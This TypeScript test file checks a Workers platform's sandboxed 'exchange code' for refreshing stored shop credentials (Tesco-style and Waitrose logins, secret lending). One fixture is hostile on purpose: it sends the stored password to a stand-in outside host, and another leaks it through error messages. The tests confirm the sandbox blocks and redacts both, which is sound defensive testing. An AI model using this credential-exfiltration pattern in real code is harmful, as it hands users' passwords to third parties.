// __workers-tests__/secret-exchange-code.test.ts — A SECRET REFRESHED BY ITS OWN EXCHANGE CODE
// (`refresh: { kind: "worker", source }`, src/secret/exchange-jail.ts): the secret's facet loads the
// source through Worker Loader and runs `exchange(material, fetch)` on first use and on a 401, its
// egress the pin alone. And Waitrose, the platform's bundled exchange code, as a person's connection
// they lend. The shop is in-process: a Tesco-shaped two-step login (a CSRF token and the cookie that
// binds it, then the form), Waitrose's GraphQL `NewSession` and a bearer-protected `/api/me`,
// answered for `SHOP` by `serveShop` below — the jail's `PinnedOutbound` and the facet's dispatch
// both use this isolate's global `fetch`.
import { expect, onTestFinished, test, vi } from "vitest";
import type { StreamEvent } from "iterate/stream/processor";
import { DurableObjectNameCodec, GLOBAL_PROJECT_ID } from "../src/context/paths.ts";
import { projectWithMember, stub } from "./support.ts";

const SHOP = "https://tesco.test";
const ELSEWHERE = "https://elsewhere.test";
const PASSWORD = "correct-horse";

test("exchange code logs in on first use and again after a 401; the catalog names the code by its hash", async () => {
  const shop = serveShop();
  const project = "prj_exchange_code_own";
  await setSecret(project, TESCO_EXCHANGE);

  expect(await me(project)).toMatchObject({ status: 200, body: { sub: "shopper@example.com" } });
  shop.expireAll();
  expect(await me(project)).toMatchObject({ status: 200, body: { sub: "shopper@example.com" } });

  expect(await refreshed(project)).toEqual([
    { kind: "worker", ok: true },
    { kind: "worker", ok: true },
  ]);
  expect(shop).toMatchObject({ logins: 2 });
  const [entry] = (await stub(project).invoke(["itx", "secrets", ["list"]], [], {
    principal: null,
  })) as { refresh: string; refreshSourceSha256: string }[];
  expect(entry).toMatchObject({
    refresh: "worker",
    refreshSourceSha256: await sha256(TESCO_EXCHANGE),
  });
});

test("exchange code that fetches an origin outside the pin fails the refresh — even when it catches the refusal — and nothing leaves", async () => {
  const shop = serveShop();
  const project = "prj_exchange_code_exfiltrates";
  await setSecret(project, EXFILTRATING_EXCHANGE);

  const answer = await me(project);
  expect(answer).toMatchObject({ status: 502 });
  expect(answer.body).toMatch(
    /the refresh failed: exchange code: .*https:\/\/elsewhere\.test, outside the secret's pin/,
  );
  expect(await refreshed(project)).toEqual([
    {
      kind: "worker",
      ok: false,
      error:
        "exchange code: the exchange code fetched https://elsewhere.test, outside the secret's pin",
    },
  ]);
  expect(shop.requests.filter((url) => new URL(url).origin === ELSEWHERE)).toEqual([]);
  expect(JSON.stringify(await log(project))).not.toContain(PASSWORD);
});

test("a thrown error comes back redacted of the material, and no env reaches the code", async () => {
  serveShop();
  const project = "prj_exchange_code_throws";
  await setSecret(project, THROWING_EXCHANGE);

  expect(await me(project)).toMatchObject({ status: 502 });
  expect(await refreshed(project)).toEqual([
    {
      kind: "worker",
      ok: false,
      error: "exchange code: env keys: [] · password [redacted] for [redacted]",
    },
  ]);
});

test("a person's exchange-code secret lent to a project: the project's first use logs in at the lender", async () => {
  const lender = await projectWithMember("exchange-code-lend");
  const shop = serveShop();
  await lender.session.user.secrets.set(
    "/secrets/tesco-mine",
    { email: "lender@example.com", password: PASSWORD },
    { urls: [SHOP], refresh: { kind: "worker", source: TESCO_EXCHANGE } },
  );
  await lender.session.user.secrets.lend("/secrets/tesco-mine", {
    to: lender.projectId,
    as: "/secrets/tesco",
  });

  expect(await me(lender.projectId)).toMatchObject({
    status: 200,
    body: { sub: "lender@example.com" },
  });
  shop.expireAll();
  expect(await me(lender.projectId)).toMatchObject({ status: 200 });
  const { actor } = await lender.session.whoami();
  const lenderSecret = DurableObjectNameCodec.stringify({
    projectId: GLOBAL_PROJECT_ID,
    path: `/users/${actor}/secrets/tesco-mine`,
  });
  expect(await refreshed(lenderSecret, "")).toEqual([
    { kind: "worker", ok: true },
    { kind: "worker", ok: true },
  ]);
});

test("a person connects Waitrose on their own account with a username and password, and lends it: the project's first use logs in at the lender", async () => {
  const lender = await projectWithMember("waitrose-lend");
  const shop = serveShop();
  const account = lender.session.user.facets.get("account");
  await expect(
    account.connectWaitrose({ connection: "mum", account: "mum@example.com" }),
  ).rejects.toThrow(/Set \/secrets\/waitrose-mum to \{ username, password \}/);
  await lender.session.user.secrets.set(
    "/secrets/waitrose-mum",
    { username: "mum@example.com", password: PASSWORD },
    { urls: [SHOP], refresh: { kind: "waitrose-session", graphqlUrl: `${SHOP}/graphql` } },
  );
  await account.connectWaitrose({ connection: "mum", account: "mum@example.com" });
  expect((await account.snapshot()).state.integrations).toMatchObject({
    "/integrations/waitrose/mum": {
      provider: "waitrose",
      connection: "mum",
      account: "mum@example.com",
    },
  });

  await lender.session.user.secrets.lend("/secrets/waitrose-mum", {
    to: lender.projectId,
    as: "/secrets/tesco",
  });
  expect(await lender.itx.secrets.list()).toContainEqual(
    expect.objectContaining({
      path: "/secrets/tesco",
      borrowed: expect.objectContaining({
        integration: expect.objectContaining({ provider: "waitrose", account: "mum@example.com" }),
      }),
    }),
  );
  expect(await me(lender.projectId)).toMatchObject({
    status: 200,
    body: { sub: "mum@example.com" },
  });
  expect(shop).toMatchObject({ logins: 1 });
});

/** The Tesco-shaped login as exchange code: the form's CSRF token and its cookie, then the form. */
const TESCO_EXCHANGE = `
export async function exchange(material, fetch) {
  const form = await fetch("${SHOP}/api/tesco/login");
  const { csrf } = await form.json();
  const cookie = form.headers.get("set-cookie").split(";")[0];
  const response = await fetch("${SHOP}/api/tesco/login", {
    method: "POST",
    headers: { cookie },
    body: new URLSearchParams({ email: material.email, password: material.password, _csrf: csrf }),
  });
  if (!response.ok) throw new Error("login answered " + response.status);
  const { access_token } = await response.json();
  return { ...material, accessToken: access_token };
}
`;

/** Exchange code that tries to mail the password elsewhere, swallows the refusal and answers a
 *  token anyway. */
const EXFILTRATING_EXCHANGE = `
export async function exchange(material) {
  try {
    await fetch("${ELSEWHERE}/collect?password=" + encodeURIComponent(material.password));
  } catch {}
  console.log("the password is", material.password);
  return { ...material, accessToken: "forged" };
}
`;

/** Exchange code that throws with the material in the message, after reporting what env it has,
 *  and leaves a rejection unhandled with it. */
const THROWING_EXCHANGE = `
import { env } from "cloudflare:workers";
export async function exchange(material) {
  Promise.reject(new Error("floating " + material.password));
  throw new Error("env keys: " + JSON.stringify(Object.keys(env)) + " · password " + material.password + " for " + material.email);
}
`;

async function setSecret(project: string, source: string) {
  await stub(project).invoke(
    [
      "itx",
      "secrets",
      [
        "set",
        "/secrets/tesco",
        { email: "shopper@example.com", password: PASSWORD },
        { urls: [SHOP], refresh: { kind: "worker", source } },
      ],
    ],
    [],
    { principal: null },
  );
}

/** `/api/me` through the context's egress, the secret's `accessToken` as the bearer. */
async function me(ctx: string) {
  const response = await stub(ctx).fetch(
    new Request(`${SHOP}/api/me`, {
      headers: { authorization: 'Bearer getSecret("/secrets/tesco", { field: "accessToken" })' },
    }),
  );
  const text = await response.text();
  return { status: response.status, body: response.ok ? JSON.parse(text) : text };
}

/** The log of the secret: `/secrets/tesco` under a project, or the context `ctx` itself. */
async function log(ctx: string, path = "/secrets/tesco"): Promise<StreamEvent[]> {
  const name = path ? `${ctx}.iterate${path}` : ctx;
  return ((await stub(name).invoke(["itx", ["readEvents", 0, 500]])) as { events: StreamEvent[] })
    .events;
}

async function refreshed(ctx: string, path?: string) {
  return (await log(ctx, path))
    .filter((event) => event.type === "events.iterate.com/secret/refreshed")
    .map((event) => event.payload);
}

async function sha256(value: string) {
  const digest = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(value));
  return [...new Uint8Array(digest)].map((byte) => byte.toString(16).padStart(2, "0")).join("");
}

/** The shop at `SHOP` (and a stranger at `ELSEWHERE`) for the rest of the test: the two-step login
 *  mints a token `/api/me` accepts until `expireAll`. `requests` is every URL either was sent. */
function serveShop() {
  const tokens = new Map<string, string>();
  const requests: string[] = [];
  const state = { logins: 0 };
  const network = globalThis.fetch;
  const spy = vi.spyOn(globalThis, "fetch").mockImplementation(async (input, init) => {
    const request = new Request(input, init);
    const { origin, pathname } = new URL(request.url);
    if (origin !== SHOP && origin !== ELSEWHERE) return network(request);
    requests.push(request.url);
    if (origin === ELSEWHERE) return new Response("collected");
    if (pathname === "/graphql") {
      // the NewSession login (src/integrations/waitrose.ts) with the fixture password
      const { variables } = (await request.json()) as {
        variables: { input: { username: string; password: string } };
      };
      if (variables.input.password !== PASSWORD)
        return Response.json({
          data: { generateSession: { failures: [{ type: "AUTHENTICATION_FAILED" }] } },
        });
      const token = crypto.randomUUID();
      tokens.set(token, variables.input.username);
      state.logins += 1;
      return Response.json({ data: { generateSession: { accessToken: token, failures: null } } });
    }
    if (pathname === "/api/tesco/login" && request.method === "GET")
      return Response.json(
        { csrf: "csrf-1" },
        { headers: { "set-cookie": "tesco_login=bound-csrf-1; Path=/api/tesco; HttpOnly" } },
      );
    if (pathname === "/api/tesco/login") {
      const form = await request.formData();
      if (
        request.headers.get("cookie") !== "tesco_login=bound-csrf-1" ||
        form.get("_csrf") !== "csrf-1"
      )
        return Response.json({ error: "invalid_csrf" }, { status: 403 });
      if (form.get("password") !== PASSWORD)
        return Response.json({ error: "invalid_credentials" }, { status: 401 });
      const token = crypto.randomUUID();
      tokens.set(token, String(form.get("email")));
      state.logins += 1;
      return Response.json({ access_token: token, expires_in: 900 });
    }
    const sub = tokens.get(request.headers.get("authorization")?.replace(/^Bearer /, "") ?? "");
    return sub
      ? Response.json({ sub })
      : Response.json({ error: "invalid_token" }, { status: 401 });
  });
  onTestFinished(() => spy.mockRestore());
  return {
    requests,
    get logins() {
      return state.logins;
    },
    expireAll: () => tokens.clear(),
  };
}
